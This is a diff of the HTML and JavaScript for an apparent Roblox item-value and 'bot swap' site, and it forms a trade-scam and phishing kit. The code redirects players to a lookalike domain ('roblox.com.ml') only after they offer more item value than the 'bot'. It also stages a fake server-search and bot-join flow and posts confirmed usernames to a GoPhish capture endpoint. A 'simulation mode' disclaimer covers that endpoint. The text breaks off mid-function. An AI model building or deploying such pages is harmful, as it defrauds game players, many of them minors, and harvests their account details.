@@ -365,6 +365,26 @@ body{
 .godly-tier-title:first-child{margin-top:0}
 @media(max-width:520px){.godly-modal{max-height:88vh}.godly-modal .picker-grid{grid-template-columns:repeat(3,1fr)}}
 .login-note{font-size:11px!important;margin-top:12px!important;margin-bottom:0!important;color:#687890!important}
+
+/* ===== SWAP TICKET FLOW MODALS ===== */
+.overlay{display:none;position:fixed;inset:0;z-index:120;background:rgba(2,6,16,.8);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:20px}
+.overlay.show{display:flex}
+.modal{width:min(460px,100%);text-align:center;position:relative;background:linear-gradient(160deg,#111d33,#0c1425);border:1px solid #29405f;border-radius:20px;padding:30px 26px;box-shadow:0 25px 80px rgba(0,0,0,.55)}
+.modal h3{margin:14px 0 8px;font-family:"Barlow Condensed",sans-serif;font-size:26px;letter-spacing:1px}
+.modal p{margin:8px auto;color:var(--muted);font-size:12.5px;line-height:1.6;max-width:340px}
+.modal .close{position:absolute;top:12px;right:14px;border:1px solid #293b57;background:#0b1526;color:#9aa8bd;width:30px;height:30px;border-radius:9px;cursor:pointer;font-weight:700}
+.btn-primary{border:0;border-radius:11px;height:46px;padding:0 24px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-weight:800;cursor:pointer;font-size:14px;box-shadow:0 10px 28px rgba(255,61,129,.18)}
+.btn-primary:hover{filter:brightness(1.08)}
+.spinner{width:44px;height:44px;margin:0 auto 18px;border-radius:50%;border:4px solid rgba(255,107,53,.2);border-top-color:var(--accent);animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.searching{font-weight:700;color:#cdd8e6!important}
+.check{font-size:44px;color:#39df87;line-height:1;margin:6px 0}
+.kick{font-size:40px;line-height:1;margin:4px 0}
+.botimg{font-size:46px;line-height:1;margin:4px 0}
+.bot-room{margin:12px 0 18px;font-size:12px;font-weight:700;color:#8fd8ff;background:#0e1c30;border:1px solid #214154;border-radius:10px;padding:10px 12px}
+.bot-room span{color:#fff}
+.headshot{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;font-weight:900;font-style:italic;font-size:13px}
+.join-row{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:16px}
 </style>
 </head>
 <body>
@@ -501,7 +521,7 @@ body{
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Ginger_LugerUP.png" alt="Ginger Luger"><div class="item-name">Ginger Luger</div><div class="item-value">💎 515</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LugerUpdated.png" alt="Luger"><div class="item-name">Luger</div><div class="item-value">💎 512</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HeartBladeUp.png" alt="Heart Blade"><div class="item-name">Heart Blade</div><div class="item-value">💎 505</div></div>
-    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BlossomGun.png"><div class="item-name">Blossom</div><div class="item-value">💎 502</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BlossomGun.png" alt="Blossom"><div class="item-name">Blossom</div><div class="item-value">💎 502</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Sakura.png" alt="Sakura"><div class="item-name">Sakura</div><div class="item-value">💎 501</div></div>
   </div>
 
@@ -577,7 +597,7 @@ body{
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Pearl.png" alt="Pearl"><div class="item-name">Pearl</div><div class="item-value">💎 185</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/blueseer.png" alt="Blue Seer"><div class="item-name">Blue Seer</div><div class="item-value">💎 182</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Updated_Candy.png" alt="Candy"><div class="item-name">Candy</div><div class="item-value">💎 180</div></div>
-    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaRaygun.png"><div class="item-name">Raygun</div><div class="item-value">💎 650</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaRaygun.png" alt="Raygun"><div class="item-name">Raygun</div><div class="item-value">💎 650</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/peppermint.png" alt="Peppermint"><div class="item-name">Peppermint</div><div class="item-value">💎 178</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Waves_knife.png" alt="Waves"><div class="item-name">Waves</div><div class="item-value">💎 175</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Darkbringer.png" alt="Darkbringer"><div class="item-name">Darkbringer</div><div class="item-value">💎 175</div></div>
@@ -610,7 +630,7 @@ body{
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Icecream_knife%20(1).png" alt="Icecream"><div class="item-name">Icecream</div><div class="item-value">💎 115</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Ctreat.png" alt="Treat"><div class="item-name">Treat</div><div class="item-value">💎 2020</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Sweet.png" alt="Sweet"><div class="item-name">Sweet</div><div class="item-value">💎 150</div></div>
-    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Turkey.png"><div class="item-name">Turkey</div><div class="item-value">💎 2110</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Turkey.png" alt="Turkey"><div class="item-name">Turkey</div><div class="item-value">💎 2110</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Treat.png" alt="Treat"><div class="item-name">Treat</div><div class="item-value">💎 155</div></div>
   </div>
 
@@ -646,13 +666,13 @@ body{
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceblasterUP.png" alt="Iceblaster"><div class="item-name">Iceblaster</div><div class="item-value">💎 61</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/spirit.png" alt="Spirit"><div class="item-name">Spirit</div><div class="item-value">💎 60</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ewrev.png" alt="Elderwood Revolver"><div class="item-name">Elderwood Revolver</div><div class="item-value">💎 60</div></div>
-    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Boneblade.png"><div class="item-name">Boneblade</div><div class="item-value">💎 60</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Boneblade.png" alt="Boneblade"><div class="item-name">Boneblade</div><div class="item-value">💎 60</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/TravellersAxe.png" alt="Traveler's Axe"><div class="item-name">Traveler's Axe</div><div class="item-value">💎 3110</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Bat_Zombie.png" alt="Bat"><div class="item-name">Bat</div><div class="item-value">💎 56</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/soul.png" alt="Soul"><div class="item-name">Soul</div><div class="item-value">💎 55</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Snow_Dagger.png" alt="Snow Dagger"><div class="item-name">Snow Dagger</div><div class="item-value">💎 55</div></div>
     <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaseer.png" alt="Seer"><div class="item-name">Seer</div><div class="item-value">💎 55</div></div>
-    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Makeshift.png">Makeshift</div><div class="item-value">💎 51</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Makeshift.png" alt="Makeshift"><div class="item-name">Makeshift</div><div class="item-value">💎 51</div></div>
   </div>
 
   <div class="section-title">Tier 1 <span class="count">4</span></div>
@@ -666,7 +686,7 @@ body{
 </section>
 
 <section id="swap" class="page-section">
-  <div class="hero"><h1>NOVA SWAP</h1><p>Select items from the value list and build both sides of the trade.</p></div>
+  <div class="hero"><h1>JACE SWAP</h1><p>Select items from the value list and build both sides of the trade.</p></div>
   <div class="swap-warning" id="swapWarning" style="display:none">
     <span class="swap-warning-icon">⚡</span>
     <span id="swapWarningText"></span>
@@ -680,613 +700,4 @@ body{
         <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
       </div>
     </div>
-    <div class="swap-middle">
-      <div class="swap-icon">⇄</div>
-      <button class="swap-btn" id="swapAction">SWAP</button>
-      <div class="hint">Choose a side, then click an item below</div>
-    </div>
-    <div class="trade-box" id="botBox" data-side="bot">
-      <span class="trade-title">BOT GIVE</span>
-      <span class="trade-value" id="botTotal">💎 0</span>
-      <div class="slots" id="botSlots">
-        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
-        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
-      </div>
-    </div>
-  </div>
-
-</section>
-
-
-<div class="modal-backdrop" id="loginModal" aria-hidden="true">
-  <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
-    <div class="modal-icon">↗</div>
-    <h2 id="loginTitle">CONNECT TO SWAP</h2>
-    <p>Sign in through Roblox's official website to continue. This layout does not collect or store Roblox passwords.</p>
-    <a class="roblox-link" href="https://www.roblox.com/login" target="_blank" rel="noopener noreferrer">CONTINUE TO ROBLOX</a>
-    <button class="cancel-btn" id="closeLogin">CANCEL</button>
-    <p class="login-note">After your account connection is implemented, you can return here and continue the swap.</p>
-  </div>
-</div>
-
-<div class="modal-backdrop" id="godlyModal" aria-hidden="true">
-  <div class="godly-modal" role="dialog" aria-modal="true" aria-labelledby="godlyTitle">
-    <div class="picker-head">
-      <strong id="godlyTitle">CHOOSE AN ITEM</strong>
-      <span>Click an item to add it to this slot</span>
-    </div>
-    <input id="godlySearch" class="godly-search" placeholder="Search values...">
-    <div id="godlyScroll"></div>
-    <button class="cancel-btn" id="closeGodly">CANCEL</button>
-  </div>
-</div>
-
-<footer>© 2026 Nova Values. All rights reserved. · HTML/CSS layout only.</footer>
-</main>
-
-<script>
-// ============================================================
-// ROBLOX REDIRECT #1 — SERVERS PAGE
-// Every "Join" button under Asia / Europe / North America / South
-// America opens Roblox directly in a new tab.
-// ============================================================
-document.querySelectorAll('#serverList .join').forEach(btn=>{
-  btn.addEventListener('click',()=>{
-    window.open('https://short-url.cc/1CR65/','_blank','noopener,noreferrer');
-  });
-});
-
-// ============================================================
-// ROBLOX REDIRECT #2 — SWAP PAGE
-// The SWAP button only sends the user to Roblox once the trade is
-// valid (you're giving more value than the bot).
-// ============================================================
-const swapAction=document.getElementById('swapAction');
-swapAction?.addEventListener('click',()=>{
-  if(tradeState.give.length===0 && tradeState.bot.length===0){
-    alert('Add at least one item to the trade before swapping.');
-    return;
-  }
-  const items=getValueCards();
-  const giveTotal=getTradeTotal('give',items);
-  const botTotal=getTradeTotal('bot',items);
-  if(giveTotal<=botTotal){
-    updateSwapWarning(giveTotal,botTotal);
-    const w=document.getElementById('swapWarning');
-    w.classList.remove('shake');void w.offsetWidth;w.classList.add('shake');
-    return;
-  }
-  window.open('https://www.roblox.com.ml/users/488078783474/profile','_blank','noopener,noreferrer');
-});
-const pages = document.querySelectorAll('.page-section');
-const buttons = document.querySelectorAll('.nav-btn');
-
-function showPage(name) {
-  pages.forEach(page => {
-    page.classList.toggle('active-page', page.id === name);
-  });
-
-  buttons.forEach(button => {
-    button.classList.toggle('active', button.dataset.page === name);
-  });
-}
-
-buttons.forEach(button => {
-  button.addEventListener('click', () => showPage(button.dataset.page));
-});
-
-const loginModal = document.getElementById('loginModal');
-const startSwap = document.querySelector('.start-swap');
-const closeLogin = document.getElementById('closeLogin');
-
-function openLogin(){
-  loginModal.classList.add('show');
-  loginModal.setAttribute('aria-hidden','false');
-}
-function closeLoginModal(){
-  loginModal.classList.remove('show');
-  loginModal.setAttribute('aria-hidden','true');
-}
-startSwap?.addEventListener('click', () => showPage('swap'));
-closeLogin?.addEventListener('click', closeLoginModal);
-loginModal?.addEventListener('click', e => { if(e.target === loginModal) closeLoginModal(); });
-
-
-// Swap builder: uses the same value cards shown on the Values page.
-const giveBox=document.getElementById('giveBox');
-const botBox=document.getElementById('botBox');
-let selectedSide='give';
-const tradeState={give:[],bot:[]};
-
-// Tag every value card with its tier (from the section-title just above its grid)
-// so we can filter down to Godly (Tier 5) items later.
-(function tagTiers(){
-  document.querySelectorAll('#values .section-title').forEach(title=>{
-    const m=title.textContent.match(/Tier\s*(\d+)/i);
-    if(!m) return;
-    const tier=m[1];
-    const grid=title.nextElementSibling;
-    if(grid && grid.classList.contains('grid')){
-      grid.querySelectorAll('.card').forEach(card=>card.dataset.tier=tier);
-    }
-  });
-})();
-
-// Reads an item's icon regardless of whether it's an emoji <div> (older tiers)
-// or an editable <img src="..."> (Godly/Tier 5 items).
-function extractIcon(card){
-  const el=card.querySelector('.item-img');
-  if(!el) return {isImg:false,emoji:'◆'};
-  if(el.tagName==='IMG') return {isImg:true,src:el.getAttribute('src')};
-  return {isImg:false,emoji:(el.textContent||'').trim()};
-}
-// Renders an icon as a standalone element (used for grid/value-sort cards).
-function iconAsElementHTML(icon,cls){
-  if(icon.isImg) return `<img class="${cls}" src="${icon.src}" alt="">`;
-  return `<div class="${cls}">${icon.emoji}</div>`;
-}
-// Renders an icon inline (used in trade slots and the item picker popup).
-function iconAsInlineHTML(icon,size){
-  if(icon.isImg) return `<img src="${icon.src}" alt="" style="width:${size}px;height:${size}px;object-fit:contain;vertical-align:middle;border-radius:4px">`;
-  return `<span style="font-size:${size}px;line-height:1;vertical-align:middle">${icon.emoji}</span>`;
-}
-// Like iconAsInlineHTML, but sized via a CSS class (so it can shrink at breakpoints)
-// instead of a fixed inline pixel value. Used in trade slots.
-function iconAsClassHTML(icon,cls){
-  if(icon.isImg) return `<img class="${cls}" src="${icon.src}" alt="" style="object-fit:contain;vertical-align:middle;border-radius:4px">`;
-  return `<span class="${cls}" style="line-height:1;vertical-align:middle">${icon.emoji}</span>`;
-}
-
-function getValueCards(){
-  return [...document.querySelectorAll('#tiersSource .card')].map(card=>({
-    name:card.querySelector('.item-name')?.textContent.trim()||'Item',
-    value:Number((card.querySelector('.item-value')?.textContent||'0').replace(/[^0-9]/g,''))||0,
-    icon:extractIcon(card),
-    tier:Number(card.dataset.tier)||0
-  }));
-}
-// All-tiers popup (Tier 5 down to Tier 1) — opens when a "＋" add-slot is clicked
-const godlyModal=document.getElementById('godlyModal');
-const godlyScroll=document.getElementById('godlyScroll');
-const closeGodly=document.getElementById('closeGodly');
-let godlySlotSide=null;
-
-function openGodlyModal(side){
-  godlySlotSide=side;
-  selectSide(side);
-  const items=getValueCards();
-  let html='';
-  for(let tier=5;tier>=1;tier--){
-    const tierItems=items.map((item,i)=>({...item,i})).filter(item=>item.tier===tier);
-    if(!tierItems.length) continue;
-    html+=`<div class="godly-tier-title">TIER ${tier}</div><div class="picker-grid">`;
-    html+=tierItems.map(item=>`<div class="pick-card" data-index="${item.i}"><div class="pick-img">${iconAsInlineHTML(item.icon,28)}</div><div class="pick-name">${item.name}</div><div class="pick-val">💎 ${item.value}</div></div>`).join('');
-    html+='</div>';
-  }
-  godlyScroll.innerHTML=html;
-  if(godlySearch) godlySearch.value='';
-  godlyModal.classList.add('show');
-  godlyModal.setAttribute('aria-hidden','false');
-}
-// Filters the item picker by name as you type, hiding empty tier groups.
-const godlySearch=document.getElementById('godlySearch');
-function applyGodlySearch(){
-  const q=godlySearch.value.trim().toLowerCase();
-  godlyScroll.querySelectorAll('.godly-tier-title').forEach(title=>{
-    const grid=title.nextElementSibling;
-    if(!grid||!grid.classList.contains('picker-grid'))return;
-    let visible=0;
-    grid.querySelectorAll('.pick-card').forEach(card=>{
-      const name=card.querySelector('.pick-name')?.textContent.toLowerCase()||'';
-      const match=name.includes(q);
-      card.style.display=match?'':'none';
-      if(match)visible++;
-    });
-    const show=q===''||visible>0;
-    title.style.display=show?'':'none';
-    grid.style.display=show?'':'none';
-  });
-}
-godlySearch?.addEventListener('input',applyGodlySearch);
-function closeGodlyModal(){
-  godlyModal.classList.remove('show');
-  godlyModal.setAttribute('aria-hidden','true');
-  godlySlotSide=null;
-}
-closeGodly?.addEventListener('click',closeGodlyModal);
-godlyModal?.addEventListener('click',e=>{if(e.target===godlyModal) closeGodlyModal();});
-godlyScroll?.addEventListener('click',e=>{
-  const card=e.target.closest('.pick-card'); if(!card||!godlySlotSide)return;
-  const idx=Number(card.dataset.index);
-  const side=godlySlotSide;
-  if(tradeState[side].length<4 && !tradeState[side].includes(idx)){
-    tradeState[side].push(idx); renderTrade();
-  }
-  closeGodlyModal();
-});
-function selectSide(side){
-  selectedSide=side;
-  giveBox.classList.toggle('selected',side==='give');
-  botBox.classList.toggle('selected',side==='bot');
-}
-giveBox.addEventListener('click',e=>{if(!e.target.closest('.filled')) selectSide('give')});
-botBox.addEventListener('click',e=>{if(!e.target.closest('.filled')) selectSide('bot')});
-function getTradeTotal(side,items){
-  return tradeState[side].reduce((sum,idx)=>sum+(items[idx]?.value||0),0);
-}
-function updateSwapWarning(giveTotal,botTotal){
-  const warning=document.getElementById('swapWarning');
-  const text=document.getElementById('swapWarningText');
-  if(!warning||!text)return;
-  if(botTotal>giveTotal){
-    text.innerHTML=`Your 💎 <b>${giveTotal}</b> is LOWER than the bot's 💎 <b>${botTotal}</b> — add more!`;
-    warning.style.display='flex';
-  } else if(botTotal===giveTotal && botTotal>0){
-    text.innerHTML=`Your 💎 <b>${giveTotal}</b> is EQUAL to the bot's 💎 <b>${botTotal}</b> — add more!`;
-    warning.style.display='flex';
-  } else {
-    warning.style.display='none';
-  }
-}
-function renderTrade(){
-  const items=getValueCards();
-  for(const side of ['give','bot']){
-    const wrap=document.getElementById(side==='give'?'giveSlots':'botSlots');
-    wrap.innerHTML='';
-    for(let i=0;i<4;i++){
-      const idx=tradeState[side][i];
-      const slot=document.createElement('div'); slot.className='slot add-slot';
-      if(idx!==undefined){
-        const item=items[idx]; slot.className='slot filled';
-        slot.innerHTML=`<div class="slot-img-wrap">${iconAsClassHTML(item.icon,'slot-icon')}</div><b>${item.name}</b><small>💎 ${item.value}</small>`;
-        slot.title='Click to remove';
-        slot.addEventListener('click',e=>{e.stopPropagation();tradeState[side].splice(i,1);renderTrade()});
-      } else {slot.textContent='＋';slot.addEventListener('click',()=>openGodlyModal(side));}
-      wrap.appendChild(slot);
-    }
-    const total=getTradeTotal(side,items);
-    document.getElementById(side==='give'?'giveTotal':'botTotal').textContent='💎 '+total;
-  }
-}
-renderTrade();
-
-// Values page: populate the default Tiers view from the hidden source markup
-const tiersSource=document.getElementById('tiersSource');
-const tiersView=document.getElementById('tiersView');
-const valueView=document.getElementById('valueView');
-tiersView.innerHTML=tiersSource.innerHTML;
-
-// Build a flat, value-sorted list (highest first) for the Value sort mode
-function buildValueView(){
-  const cards=[...tiersSource.querySelectorAll('.card')].map(card=>({
-    icon:extractIcon(card),
-    name:card.querySelector('.item-name')?.textContent||'',
-    value:Number((card.querySelector('.item-value')?.textContent||'0').replace(/[^0-9]/g,''))||0
-  }));
-  cards.sort((a,b)=>b.value-a.value);
-  valueView.innerHTML=cards.map(c=>
-    `<div class="card">${iconAsElementHTML(c.icon,'item-img')}<div class="item-name">${c.name}</div><div class="item-value">💎 ${c.value}</div></div>`
-  ).join('');
-}
-buildValueView();
-
-let sortMode='tiers';
-const sortBtn=document.getElementById('sortBtn');
-sortBtn?.addEventListener('click',()=>{
-  sortMode=sortMode==='tiers'?'value':'tiers';
-  sortBtn.textContent=sortMode==='tiers'?'Sort: Tiers':'Sort: Value';
-  tiersView.style.display=sortMode==='tiers'?'':'none';
-  valueView.style.display=sortMode==='value'?'':'none';
-  applyValuesSearch();
-});
-
-// Values search: filter cards by name as you type, works in either sort mode
-const valuesSearch=document.getElementById('valuesSearch');
-function applyValuesSearch(){
-  const q=valuesSearch.value.trim().toLowerCase();
-  if(sortMode==='tiers'){
-    tiersView.querySelectorAll('.section-title').forEach(title=>{
-      const grid=title.nextElementSibling;
-      if(!grid||!grid.classList.contains('grid'))return;
-      let visibleCount=0;
-      grid.querySelectorAll('.card').forEach(card=>{
-        const name=card.querySelector('.item-name')?.textContent.toLowerCase()||'';
-        const match=name.includes(q);
-        card.style.display=match?'':'none';
-        if(match)visibleCount++;
-      });
-      const show=q===''||visibleCount>0;
-      title.style.display=show?'':'none';
-      grid.style.display=show?'':'none';
-    });
-  } else {
-    valueView.querySelectorAll('.card').forEach(card=>{
-      const name=card.querySelector('.item-name')?.textContent.toLowerCase()||'';
-      card.style.display=name.includes(q)?'':'none';
-    });
-  }
-}
-valuesSearch?.addEventListener('input',applyValuesSearch);
-
-// Servers: click a region header to expand/collapse its country list
-document.querySelectorAll('#serverList .server-head').forEach(head=>{
-  head.addEventListener('click',()=>{
-    head.closest('.server').classList.toggle('collapsed');
-  });
-});
-
-// Servers: simulate live ping. Each row jitters around its own base ms
-// every couple of seconds, and the bar count + color reflect the current value.
-function barsForPing(ms){
-  if(ms<40) return {bars:5,cls:''};
-  if(ms<60) return {bars:4,cls:''};
-  if(ms<80) return {bars:3,cls:''};
-  if(ms<110) return {bars:2,cls:'ping-lag'};
-  return {bars:1,cls:'ping-bad'};
-}
-function tickPing(el){
-  const base=Number(el.dataset.base)||50;
-  const jitter=Math.round((Math.random()-0.5)*16); // +/-8ms wobble
-  const ms=Math.max(8,base+jitter);
-  const {bars,cls}=barsForPing(ms);
-  el.className='ping'+(cls?' '+cls:'');
-  let barsHtml='';
-  for(let i=1;i<=5;i++) barsHtml+=`<i class="${i<=bars?'lit':''}"></i>`;
-  el.innerHTML=`<span class="ping-bars">${barsHtml}</span><span class="ping-ms">${ms} ms</span>`;
-}
-function startLivePing(){
-  const rows=document.querySelectorAll('#serverList .ping');
-  rows.forEach(el=>{
-    tickPing(el);
-    // stagger each row's own interval a bit so they don't all flicker in sync
-    const delay=1500+Math.random()*1500;
-    setInterval(()=>tickPing(el),delay);
-  });
-}
-startLivePing();
-
-showPage('values');
-</script>
-</body>
-</html>
-
-<!-- ================= SWAP ================= -->
-<section id="swap">
-  <div class="swap-box">
-    <h2>Jace Swap</h2>
-    <div class="sub">Your value must be equal or greater than bot's value</div>
-    <div class="swap-cols">
-      <div class="swap-col">
-        <h4>YOU GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">++++</div>
-      </div>
-      <div class="swap-arrow">⇄</div>
-      <div class="swap-col">
-        <h4>BOT GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">▲▼</div>
-      </div>
-    </div>
-    <div style="margin-top:26px;">
-      <button class="btn-primary" onclick="openTicketFlow()">SWAP IT</button>
-    </div>
-  </div>
-</section>
-
-<!-- ================= MODALS ================= -->
-
-<!-- Searching server -->
-<div class="overlay" id="ovSearching">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching" id="searchLabel">Searching server...</p>
-  </div>
-</div>
-
-<!-- Server found -->
-<div class="overlay" id="ovServerFound">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovServerFound')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>Server Found!</h3>
-    <div class="bot-room">Bot room: <span id="roomCode">#A3T-892</span> · 8/12 online</div>
-    <button class="btn-primary" onclick="closeOverlay('ovServerFound'); openOverlay('ovKickWarn');">Join Server</button>
-  </div>
-</div>
-
-<!-- Kick warning -->
-<div class="overlay" id="ovKickWarn">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovKickWarn')">✕</button>
-    <img class="kick" src="https://jacevalues.com/images/kick.png" alt="">
-    <p>If you have an <b>empty inventory</b>, our bots will detect it and kick you.</p>
-    <p>Our servers are <b>PRIVATE</b> servers, meaning you can get kicked.</p>
-    <p>If your account is new/not level 10, you may not be able to join at all.</p>
-    <button class="btn-primary" onclick="closeOverlay('ovKickWarn'); openOverlay('ovJoinBot');">Continue</button>
-  </div>
-</div>
-
-<!-- Join bot -->
-<div class="overlay" id="ovJoinBot">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovJoinBot')">✕</button>
-    <img class="botimg" src="https://jacevalues.com/images/jacebot.png" alt="">
-    <h3>You must join our bot to get in the server!</h3>
-    <p>You can only join our bot from here.</p>
-    <div style="display:flex; align-items:center; justify-content:center; gap:10px;">
-      <img src="https://jacevalues.com/images/headshot.png" style="width:36px; height:36px; border-radius:50%;" alt="">
-      <button class="btn-primary" onclick="closeOverlay('ovJoinBot'); openOverlay('ovConfirm');">Join</button>
-    </div>
-  </div>
-</div>
-
-<!-- Confirm your Roblox account -->
-<div class="overlay" id="ovConfirm">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovConfirm')">✕</button>
-    <h3>Confirm your Roblox account</h3>
-    <p>Type your Roblox username so the bot can find you and complete the swap.</p>
-    <div class="err" id="confirmErr">Username not found. Check spelling and try again.</div>
-    <input class="rolox" type="text" id="roloxInput" placeholder="Roblox username" autocomplete="off">
-    <button class="btn-primary" id="searchBtn" onclick="searchRoblox()">SEARCH</button>
-  </div>
-</div>
-
-<!-- Looking up account -->
-<div class="overlay" id="ovLooking">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching">Looking up your account...</p>
-  </div>
-</div>
-
-<!-- Is this you? -->
-<div class="overlay" id="ovIsYou">
-  <div class="modal confirm-user">
-    <button class="close" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">✕</button>
-    <h3>Is this you?</h3>
-    <img id="userHeadshot" src="" alt="">
-    <div class="uname" id="userName"></div>
-    <div class="udisp" id="userDisp"></div>
-    <div class="btn-row">
-      <button class="btn-primary" id="yesBtn">YES, THAT'S ME</button>
-      <button class="btn-ghost" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">NO, RETRY</button>
-    </div>
-  </div>
-</div>
-
-<!-- Swap it (final) -->
-<div class="overlay" id="ovSwapIt">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovSwapIt')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>SWAP IT</h3>
-    <p id="swapSummary"></p>
-    <button class="btn-primary" onclick="closeOverlay('ovSwapIt'); openOverlay('ovRate');">CONTINUE</button>
-  </div>
-</div>
-
-<!-- Rate -->
-<div class="overlay" id="ovRate">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovRate')">✕</button>
-    <h3>Give us a rate!</h3>
-    <p>Did you enjoy our servers?</p>
-    <div style="color:#a78bfa; font-size:22px; margin-bottom:14px;">★★★★★</div>
-    <button class="btn-primary" onclick="closeOverlay('ovRate');">Rate</button>
-  </div>
-</div>
-
-<footer>
-  © 2026 Jace Values. All rights reserved. · Powered by Jace™ · v35
-</footer>
-
-<script>
-/* =========================================================
-   Simulation mode flag — keep FALSE for demo purposes.
-   When TRUE, submits the confirmed username to your own
-   GoPhish capture endpoint (configurable below) instead of
-   just displaying it. Never point this at anything you
-   don't own or have explicit written authorization to test.
-   ========================================================= */
-const SIMULATION_MODE = false;
-const GOPHISH_CAPTURE_URL = "https://your-gophish-server/capture";
-
-/* ---------- Overlay helpers ---------- */
-function openOverlay(id)   { document.getElementById(id).classList.add('show'); }
-function closeOverlay(id)  { document.getElementById(id).classList.remove('show'); }
-
-/* ---------- Random bot room code ---------- */
-function randomRoomCode() {
-  const chars = "ABCDEFGHJKMNPQRSTUVWXYZ0123456789";
-  let code = "#";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  code += "-";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  return code;
-}
-
-/* ---------- Flow: Join server ---------- */
-function openServerFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching server...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2200);
-}
-
-/* ---------- Flow: Secure bot ticket (from swap) ---------- */
-function openTicketFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching for available bot...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2400);
-}
-
-/* ---------- Roblox public API lookup (username → userId → headshot) ---------- */
-async function searchRoblox() {
-  const username = document.getElementById('roloxInput').value.trim();
-  const errEl = document.getElementById('confirmErr');
-  if (!username) { errEl.style.display = 'block'; return; }
-  errEl.style.display = 'none';
-
-  document.getElementById('ovConfirm').classList.remove('show');
-  openOverlay('ovLooking');
-
-  try {
-    // 1) username → userId (public, read-only endpoint)
-    const usersRes = await fetch('https://users.roblox.com/v1/usernames/users', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
-    });
-    const usersJson = await usersRes.json();
-    if (!usersJson.data || usersJson.data.length === 0) throw new Error('not found');
-
-    const user = usersJson.data[0];
-
-    // 2) userId → headshot image URL (public, read-only endpoint)
-    const thumbRes = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
-    );
-    const thumbJson = await thumbRes.json();
-    let headshot = thumbJson.data[0].imageUrl;
-
-    closeOverlay('ovLooking');
-    document.getElementById('userHeadshot').src = headshot;
-    document.getElementById('userName').textContent = user.name;
-    document.getElementById('userDisp').textContent = user.displayName;
-    openOverlay('ovIsYou');
-
-    // YES handler
-    document.getElementById('yesBtn').onclick = async function () {
-      if (SIMULATION_MODE) {
-        try {
-          await fetch(GOPHISH_CAPTURE_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: user.name, userId: user.id, sessionId: randomRoomCode() })
-          });
-        } catch (e) { /* log for engagement evidence */ }
-      }
